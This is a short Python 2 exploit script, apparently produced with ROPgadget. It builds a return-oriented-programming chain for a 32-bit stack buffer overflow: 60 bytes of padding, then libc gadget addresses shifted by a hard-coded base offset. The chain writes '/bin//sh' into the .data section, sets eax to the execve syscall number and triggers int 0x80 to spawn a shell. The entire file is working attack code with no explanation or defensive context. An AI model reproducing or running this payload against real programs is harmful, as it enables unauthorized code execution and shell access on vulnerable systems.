#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Use the low address of Libc
LibcLowAddr=0xb560b000 
offset = 0xb7e11000 - LibcLowAddr


# Padding goes here
p = ''
p += "A" * 60
p += pack('<I', 0xb7e12aa2-offset) # pop edx ; ret
p += pack('<I', 0xb7fbe040-offset) # @ .data
p += pack('<I', 0xb7e3570f-offset) # pop eax ; ret
p += '/bin'
p += pack('<I', 0xb7eba2ac-offset) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e12aa2-offset) # pop edx ; ret
p += pack('<I', 0xb7fbe044-offset) # @ .data + 4
p += pack('<I', 0xb7e3570f-offset) # pop eax ; ret
p += '//sh'
p += pack('<I', 0xb7eba2ac-offset) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e12aa2-offset) # pop edx ; ret
p += pack('<I', 0xb7fbe048-offset) # @ .data + 8
p += pack('<I', 0xb7e7876f-offset) # xor eax, eax ; pop esi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7eba2ac-offset) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e2a93e-offset) # pop ebx ; ret
p += pack('<I', 0xb7fbe040-offset) # @ .data
p += pack('<I', 0xb7e3f44b-offset) # pop ecx ; pop edx ; ret
p += pack('<I', 0xb7fbe048-offset) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7e12aa2-offset) # pop edx ; ret
p += pack('<I', 0xb7fbe048-offset) # @ .data + 8
p += pack('<I', 0xb7e7876f-offset) # xor eax, eax ; pop esi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e26fa4-offset) # inc eax ; ret
p += pack('<I', 0xb7e3f725-offset) # int 0x80

print p
